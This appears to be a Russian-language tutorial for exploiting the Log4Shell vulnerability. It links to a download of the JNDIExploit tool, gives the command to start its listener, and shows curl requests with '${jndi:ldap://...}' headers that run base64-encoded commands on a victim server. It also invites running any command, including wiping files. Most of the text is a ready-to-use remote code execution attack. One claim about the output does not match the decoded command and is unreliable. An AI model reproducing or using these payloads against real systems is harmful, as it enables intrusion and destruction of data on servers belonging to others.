# alex_programms
новая уязвимость log4shell

Скачивание эксплоита:

Переходим по ссылке:
https://bit.ly/3E4kxuk

И ждём скачивание файла(если ссылка не открылась,используйте vpn.
Это ссылка на сайт веб архив,который успел сохранить ссылку на архив старого репозитория(его удалили)

Установка эксплоита:
Переходим в папку загрузок и распаковываем архив:

unzip JNDIExploit.v1.2.zip

Далее вводим эту команду для прослушки 1389 и 8888 портов:

java -jar JNDIExploit-1.2-SNAPSHOT.jar -i LOCAL_IP -p 8888 
Где LOCAL_IP - IP-адрес атакующего.


Атака на сервер:
Итак, у нас есть уязвимый сервер и эксплоит для него. Теперь вводим эту команду:

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LOCAL_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
Где 127.0.0.1:8080 - IP жертвы (сервера), а LOCAL_IP - IP-адрес атакующего.

Эта команда отправляет запрос на сервер для удалённого выполнения команды в виде base64. Где "dG91Y2ggL3RtcC9wd25lZAo=" - и есть команда. При расшифровке можно понять, что она делает:


Команда создаёт файл по пути /tmp с названием pwned. После её выполнения в терминале отобразится текст "Hello, world!".


Чтобы проверить, выполнена ли команда на сервере, проверяем на нём файлы:

docker exec vulnerable-app ls /tmp
Должен отобразится файл pwned.


Вместо команды, показанной в примере, можно выполнить любую другую. Например перезапуск сервера, запуск другого эксплоита, удаление всех файлов и тд. 

Предположим у нас стоит задача теперь удалить файл pwned, который мы создали. Для этого будет такая команда:

cd /tmp && rm pwned 
Чтобы её запустить на атакуемом сервере, нужно открыть какой-нибудь base64 декодер и зашифровать её:


Копируем результат и вставляем в эту команду:

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LOCAL_IP:1389/Basic/Command/Base64/Base64_code}'
Где 

127.0.0.1:8080 - IP жертвы (сервера), 

LOCAL_IP - IP-адрес атакующего, 

а Base64_code - скопированный раннее результат (сюда и нужно вставить результат).



У меня получилась такая команда:

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.2.15:1389/Basic/Command/Base64/Y2QgL3RtcCAmJiBybSBwd25lZCA=}'
    
